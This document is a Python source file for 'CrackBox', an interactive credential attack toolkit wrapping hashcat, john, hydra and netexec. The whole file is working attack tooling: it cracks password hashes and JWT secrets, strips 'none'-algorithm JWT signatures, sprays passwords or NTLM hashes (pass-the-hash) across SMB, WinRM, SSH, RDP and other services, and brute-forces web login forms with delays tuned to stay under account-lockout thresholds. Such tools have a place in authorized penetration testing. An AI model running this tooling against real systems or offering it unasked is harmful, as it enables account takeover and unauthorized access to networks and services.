#!/usr/bin/env python3
"""
CrackBox – Interactive credential attacking toolkit
Leverages hashcat, john, hydra, netexec, hash-identifier


Features:
  - Hash cracking (hashcat / john)
  - Password spraying (netexec, with pass-the-hash support)
  - Targeted brute-forcing (hydra pitchfork, lockout-aware)
  - JWT signature cracking (HS256/384/512) + none-alg detection
"""

import os, sys, subprocess, base64, json, tempfile, time, shutil, logging, re
from datetime import datetime
from urllib.parse import urlparse

# -------------------------------------------------------------------
# Logging
# -------------------------------------------------------------------
LOG_FILE = f"crackbox_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("crackbox")

# -------------------------------------------------------------------
# Constants
# -------------------------------------------------------------------
VALID_PROTOCOLS = {"smb", "winrm", "ssh", "mssql", "rdp", "ftp"}

COMMON_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "./rockyou.txt",
]

# Matches John's summary line: "1 password hash cracked, 0 left" etc.
JOHN_SUMMARY_RE = re.compile(r"^\d+ password hashes?\b", re.IGNORECASE)


# -------------------------------------------------------------------
# Safe command runners (no shell=True, no secret leakage)
# -------------------------------------------------------------------
def run_safe(cmd_list, input_text=None, log_cmd=None):
    """
    Run a command as a list (no shell injection possible).
    log_cmd replaces the real command in logs to avoid exposing secrets.
    Raises RuntimeError on non-zero exit.
    """
    display = log_cmd if log_cmd else " ".join(cmd_list)
    log.info("Running: %s", display)
    result = subprocess.run(
        cmd_list, input=input_text, capture_output=True, text=True
    )
    if result.stderr.strip():
        log.debug("stderr: %s", result.stderr.strip())
    if result.returncode != 0:
        log.error(
            "Command failed (code %d): %s",
            result.returncode,
            result.stderr.strip(),
        )
        raise RuntimeError(result.stderr.strip())
    return result.stdout


def run_piped(cmd_list, input_text):
    """
    Pipe input_text into a program's stdin. Returns stdout.
    Does NOT raise on non-zero exit (hash-identifier exits 1 on success).
    """
    log.info("Piping into: %s", " ".join(cmd_list))
    p = subprocess.Popen(
        cmd_list,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    out, _ = p.communicate(input=input_text)
    return out


def safe_unlink(path):
    """Delete a file, silently ignoring errors (e.g., already deleted)."""
    try:
        os.unlink(path)
    except OSError:
        pass


def ts():
    """Microsecond-precision timestamp string for unique output filenames."""
    return datetime.now().strftime("%H%M%S_%f")


# -------------------------------------------------------------------
# Tool checks at startup
# -------------------------------------------------------------------
REQUIRED_TOOLS = ["hashcat", "john", "hydra", "netexec", "hash-identifier"]
missing = [t for t in REQUIRED_TOOLS if shutil.which(t) is None]
if missing:
    log.critical("Missing tools: %s. Install them and re-run.", ", ".join(missing))
    sys.exit(1)


# -------------------------------------------------------------------
# Wordlist discovery (uncompressed only)
# -------------------------------------------------------------------
def find_rockyou():
    for path in COMMON_WORDLISTS:
        if os.path.exists(path):
            return path
    return None


# -------------------------------------------------------------------
# Helper: safe integer prompt
# -------------------------------------------------------------------
def ask_int(prompt, default=None):
    while True:
        try:
            ans = input(prompt + " ").strip()
            if ans == "" and default is not None:
                return default
            return int(ans)
        except ValueError:
            print("Please enter a valid number.")


# -------------------------------------------------------------------
# Option 1 – Hash cracking
# -------------------------------------------------------------------
def hash_cracking():
    print("\n--- Crack a hash ---")
    hash_value = input("Paste the hash here: ").strip()
    if not hash_value:
        print("[!] No hash provided. Returning to menu.")
        return

    print("[*] Identifying hash type...")
    out = run_piped(["hash-identifier"], hash_value)
    print(out)

    tool = input("Which tool? (hashcat / john) [hashcat]: ").strip().lower() or "hashcat"
    if tool not in ("hashcat", "john"):
        print("[!] Invalid choice, defaulting to hashcat.")
        tool = "hashcat"

    wordlist = input("Path to wordlist [auto]: ").strip()
    if not wordlist:
        wordlist = find_rockyou()
        if not wordlist:
            print("[!] Could not find wordlist automatically. Please provide a path.")
            return
        print(f"[*] Using found wordlist: {wordlist}")
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist '{wordlist}' not found.")
        return

    # Write hash to temp file — keeps it off the command line
    tmp = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".hash")
    tmp.write(hash_value + "\n")
    tmpname = tmp.name
    tmp.close()

    try:
        if tool == "hashcat":
            mode = (
                input("Hashcat mode number (e.g., 0=MD5, 1000=NTLM) [0]: ").strip()
                or "0"
            )
            if not mode.isdigit():
                print("[!] Mode must be a number.")
                return
            outfile = f"cracked_{ts()}.txt"
            force = input("Use --force? (y/N): ").strip().lower() == "y"
            cmd = ["hashcat", "-m", mode, "-a", "0", tmpname, wordlist, "-o", outfile]
            if force:
                cmd.append("--force")
            print(f"[*] Running hashcat (mode {mode})...")
            run_safe(cmd)
            if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
                print(f"[+] Cracked! Results in {outfile}:")
                with open(outfile) as f:
                    print(f.read())
            else:
                print("[-] No password found with this wordlist.")

        else:  # john
            run_safe(["john", "--wordlist=" + wordlist, tmpname])
            show_result = run_safe(["john", "--show", tmpname])
            # Use a precise regex to filter only the summary line.
            # This correctly keeps cracked entries whose username starts with a digit.
            cracked_lines = [
                l for l in show_result.splitlines()
                if l.strip() and not JOHN_SUMMARY_RE.match(l.strip())
            ]
            if cracked_lines:
                print("[+] Cracked passwords:")
                print("\n".join(cracked_lines))
            else:
                print("[-] No passwords were cracked.")
    finally:
        safe_unlink(tmpname)


# -------------------------------------------------------------------
# Option 2 – Password spraying (password + pass-the-hash)
# -------------------------------------------------------------------
def password_spraying():
    print("\n--- Password spraying ---")

    protocol = (
        input(f"Protocol ({' / '.join(sorted(VALID_PROTOCOLS))}) [smb]: ")
        .strip().lower() or "smb"
    )
    if protocol not in VALID_PROTOCOLS:
        print(
            f"[!] Unknown protocol '{protocol}'. "
            f"Supported: {', '.join(sorted(VALID_PROTOCOLS))}"
        )
        return

    target   = input("Target IP, range, or file [192.168.1.0/24]: ").strip() or "192.168.1.0/24"
    userlist = input("File containing usernames [users.txt]: ").strip() or "users.txt"
    if not os.path.exists(userlist):
        print(f"[!] '{userlist}' not found.")
        return

    # Optional domain — netexec defaults to WORKGROUP if omitted
    domain = input("Domain (leave blank for WORKGROUP / local accounts): ").strip()

    auth_type = (
        input("Auth type (password / hash) [password]: ").strip().lower() or "password"
    )
    if auth_type not in ("password", "hash"):
        print("[!] Invalid auth type. Choose 'password' or 'hash'.")
        return

    base_cmd = ["netexec", protocol, target, "-u", userlist]
    if domain:
        base_cmd += ["-d", domain]

    if auth_type == "hash":
        ntlm_hash = input("NTLM hash (format LM:NT or just NT part): ").strip()
        if not ntlm_hash:
            print("[!] No hash provided.")
            return
        cmd     = base_cmd + ["-H", ntlm_hash, "--continue-on-success"]
        log_cmd = (
            f"netexec {protocol} {target} -u {userlist}"
            + (f" -d {domain}" if domain else "")
            + " -H *** --continue-on-success"
        )
        run_safe(cmd, log_cmd=log_cmd)
        return

    # Password auth
    spray_type = (
        input("Spray with a single password or a list? (single / list) [single]: ")
        .strip().lower() or "single"
    )

    if spray_type == "single":
        password = input("Password: ").strip()
        cmd      = base_cmd + ["-p", password, "--continue-on-success"]
        log_cmd  = (
            f"netexec {protocol} {target} -u {userlist}"
            + (f" -d {domain}" if domain else "")
            + " -p *** --continue-on-success"
        )
        run_safe(cmd, log_cmd=log_cmd)

    else:
        passlist = input("File with passwords [passwords.txt]: ").strip() or "passwords.txt"
        if not os.path.exists(passlist):
            print(f"[!] '{passlist}' not found.")
            return

        delay = ask_int(
            "Delay between passwords in seconds (0 = netexec built-in spray) [0]: ", 0
        )

        if delay == 0:
            # --no-bruteforce: one password tried across all users before moving on.
            # NOTE: behaviour varies across netexec versions — if results look wrong,
            # re-run with a manual delay (any value > 0) to use the explicit loop instead.
            cmd = base_cmd + ["-p", passlist, "--continue-on-success", "--no-bruteforce"]
            run_safe(cmd)
        else:
            with open(passlist) as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"[*] Spraying {len(passwords)} passwords with {delay}s delay.")
            for idx, pwd in enumerate(passwords, 1):
                print(f"\n[+] Trying password {idx}/{len(passwords)}...")
                cmd     = base_cmd + ["-p", pwd, "--continue-on-success"]
                log_cmd = (
                    f"netexec {protocol} {target} -u {userlist}"
                    + (f" -d {domain}" if domain else "")
                    + " -p *** --continue-on-success"
                )
                run_safe(cmd, log_cmd=log_cmd)
                if idx < len(passwords):
                    time.sleep(delay)


# -------------------------------------------------------------------
# Option 3 – Targeted brute-forcing (pitchfork, lockout-aware)
# -------------------------------------------------------------------
def targeted_bruteforce():
    print("\n--- Targeted brute-forcing (Pitchfork mode) ---")

    user_file = input("Path to usernames file [users.txt]: ").strip() or "users.txt"
    pass_file = input("Path to passwords file [passwords.txt]: ").strip() or "passwords.txt"
    if not os.path.exists(user_file) or not os.path.exists(pass_file):
        print("[!] One or both files do not exist.")
        return

    with open(user_file) as uf, open(pass_file) as pf:
        users  = [u.strip() for u in uf if u.strip()]
        passes = [p.strip() for p in pf if p.strip()]

    if len(users) != len(passes):
        print(f"[!] User count ({len(users)}) != password count ({len(passes)}). Must match.")
        return

    # combo_file name decided before the try block, but created inside it —
    # guarantees the finally cleanup always covers the file if it exists.
    combo_file = f"pitchfork_combo_{ts()}.txt"

    try:
        with open(combo_file, "w") as cf:
            for u, p in zip(users, passes):
                cf.write(f"{u}:{p}\n")
        print(f"[+] Combo file '{combo_file}' created with {len(users)} pairs.")

        safe_delay = 0
        if len(set(users)) < len(users):
            print("\n[*] Duplicate usernames detected – lockout policy applies.")
            max_attempts = ask_int("Max failed attempts before lockout [5]: ", 5)
            if max_attempts <= 1:
                print("[!] Threshold of 1 means any attempt risks lockout. Aborting.")
                return
            window_min = ask_int("Reset window in minutes [30]: ", 30)
            # Leave one attempt as buffer
            safe_delay = (window_min * 60) / (max_attempts - 1)
            print(f"[*] Recommended delay per attempt = {safe_delay:.1f}s")
            if input("Use this delay? (Y/n): ").strip().lower() == "n":
                safe_delay = ask_int("Enter custom delay in seconds: ")
        else:
            print("[*] No duplicate usernames – no lockout risk from this list.")

        target_url  = input("Target URL (e.g., http://192.168.1.10/login.php): ").strip()
        method      = input("HTTP method (GET / POST) [POST]: ").strip().upper() or "POST"
        form_params = input(
            "Form body with ^USER^ and ^PASS^ (e.g., user=^USER^&pass=^PASS^): "
        ).strip()
        condition   = (
            input("Condition (e.g., F=incorrect, S=dashboard) [F=incorrect]: ").strip()
            or "F=incorrect"
        )

        parsed = urlparse(target_url)
        if parsed.scheme not in ("http", "https") or not parsed.netloc:
            print("[!] Invalid URL. Must start with http:// or https:// and include a host.")
            return

        host      = parsed.netloc
        full_path = parsed.path or "/"
        if parsed.query:
            full_path += "?" + parsed.query

        threads   = "1" if safe_delay > 0 else "4"
        cmd_parts = ["hydra", "-C", combo_file, "-t", threads]
        if parsed.scheme == "https":
            cmd_parts.append("-S")                         # enable SSL
        if safe_delay > 0:
            cmd_parts += ["-W", str(int(safe_delay))]     # wait between attempts
        cmd_parts += [
            host,
            f"http-{method.lower()}-form",
            f"{full_path}:{form_params}:{condition}",
        ]

        print(f"[+] Hydra command: {' '.join(cmd_parts)}")
        if input("Run it? (Y/n): ").strip().lower() != "n":
            run_safe(cmd_parts)

    finally:
        safe_unlink(combo_file)


# -------------------------------------------------------------------
# Option 4 – JWT signature cracking
# -------------------------------------------------------------------
def jwt_cracking():
    print("\n--- JWT signature cracking ---")
    token = input("Paste the complete JWT token: ").strip()
    if not token:
        print("[!] No token provided.")
        return

    parts = token.split(".")
    if len(parts) != 3:
        print("[!] JWT must have exactly three parts separated by dots.")
        return

    # Decode and normalise the header
    try:
        header_b64  = parts[0]
        pad         = (4 - len(header_b64) % 4) % 4
        header_json = base64.urlsafe_b64decode(header_b64 + "=" * pad).decode()
        header      = json.loads(header_json)
        alg         = header.get("alg", "").upper()
    except Exception as e:
        print(f"[!] Could not decode JWT header: {e}")
        return

    # none-algorithm: signature stripping
    if alg == "NONE":
        print("[!] JWT uses 'none' algorithm – signature can be stripped!")
        if input("Generate stripped token? (Y/n): ").strip().lower() != "n":
            stripped = ".".join(parts[:2]) + "."
            print(f"[+] Stripped token:\n{stripped}")
        return

    hs_modes = {"HS256": 16500, "HS384": 16501, "HS512": 16502}
    if alg not in hs_modes:
        print(f"[!] Algorithm '{alg}' is not supported here (HS256/384/512 only).")
        return

    wordlist = input("Path to wordlist [auto]: ").strip()
    if not wordlist:
        wordlist = find_rockyou()
        if not wordlist:
            print("[!] Could not locate a wordlist automatically. Please provide one.")
            return
        print(f"[*] Using {wordlist}")
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist '{wordlist}' not found.")
        return

    # Token goes to a temp file — keeps it off the command line and log
    tmp = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".jwt")
    tmp.write(token + "\n")
    token_file = tmp.name
    tmp.close()

    mode_num = hs_modes[alg]
    outfile  = f"jwt_cracked_{ts()}.txt"
    cmd      = ["hashcat", "-m", str(mode_num), "-a", "0", token_file, wordlist, "-o", outfile]
    log_cmd  = f"hashcat -m {mode_num} -a 0 <token_file> {wordlist} -o {outfile}"

    print(f"[*] Running hashcat mode {mode_num} ({alg})...")
    try:
        run_safe(cmd, log_cmd=log_cmd)
        if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
            print(f"[+] Secret found! Saved in {outfile}:")
            with open(outfile) as f:
                print(f.read())
        else:
            print("[-] No secret found with this wordlist.")
    finally:
        safe_unlink(token_file)


# -------------------------------------------------------------------
# Main menu
# -------------------------------------------------------------------
def main():
    print(r"""
   ____                _   ____
  / ___|_ __ __ _  ___| |_| __ )  _____  __
 | |   | '__/ _` |/ __| __|  _ \ / _ \ \/ /
 | |___| | | (_| | (__| |_| |_) | (_) >  <
  \____|_|  \__,_|\___|\__|____/ \___/_/\_\
         Credential Attack Toolkit
    """)
    menu = {
        "1": ("Crack a hash",                        hash_cracking),
        "2": ("Password spraying",                   password_spraying),
        "3": ("Targeted brute-forcing (pitchfork)",  targeted_bruteforce),
        "4": ("JWT signature cracking",              jwt_cracking),
    }
    try:
        while True:
            print("\nWhat would you like to do?")
            for key, (label, _) in menu.items():
                print(f"  {key}) {label}")
            print("  5) Exit")
            choice = input("Enter your choice (1-5): ").strip()
            if choice in menu:
                try:
                    menu[choice][1]()
                except RuntimeError as e:
                    print(f"[!] Tool error: {e}")
            elif choice == "5":
                print("Goodbye!")
                break
            else:
                print("[!] Invalid choice.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting cleanly.")


if __name__ == "__main__":
    main()
